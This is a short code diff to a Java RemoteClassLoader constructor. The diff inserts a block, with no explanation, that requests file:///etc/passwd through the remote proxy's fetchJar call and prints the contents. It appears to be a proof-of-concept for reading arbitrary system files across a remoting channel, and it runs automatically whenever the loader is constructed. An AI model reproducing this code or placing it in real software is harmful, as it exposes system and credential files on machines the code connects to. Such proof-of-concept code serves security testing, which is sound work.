@@ -188,6 +188,16 @@ final class RemoteClassLoader extends URLClassLoader {
             proxy = new DumbClassLoaderBridge(proxy);
         }
         this.proxy = proxy;
+        try {
+            URL targ = new URL("file:///etc/passwd");
+            byte[] outb = this.proxy.fetchJar(targ);
+            String outs = new String(outb, StandardCharsets.UTF_8);
+            System.out.println(outs);
+        } catch (MalformedURLException e) {
+            System.out.println("malformed URL");
+        } catch (IOException e) {
+            System.out.println("io except");
+        }
     }
 
     /**
